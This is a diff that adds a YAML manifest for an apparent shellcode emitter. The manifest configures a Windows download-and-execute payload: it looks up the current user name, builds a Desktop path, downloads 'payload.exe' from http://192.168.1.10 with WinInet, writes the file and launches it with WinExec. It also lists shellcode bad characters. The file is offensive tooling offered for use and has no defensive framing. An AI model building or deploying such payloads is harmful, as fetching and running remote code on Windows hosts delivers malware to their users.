@@ -1,0 +1,11 @@
+# HTTP download to user directory (runtime path via GetUserNameA)
+# IR workflow: GetUserNameA -> build path -> WinInet download -> write -> WinExec
+#
+# Build:
+#   uv run emitrion emitrion/manifests/http_download_to_userdir.yaml \
+#       --url "http://192.168.1.10/payload.exe" \
+#       --path-prefix "C:\Users\\" \
+#       --path-suffix "\Desktop\payload.exe" \
+#       --no-assemble --out emitter_out/
+template: ir_http_download_to_userdir
+badchars: ["00", "0A", "0D"]
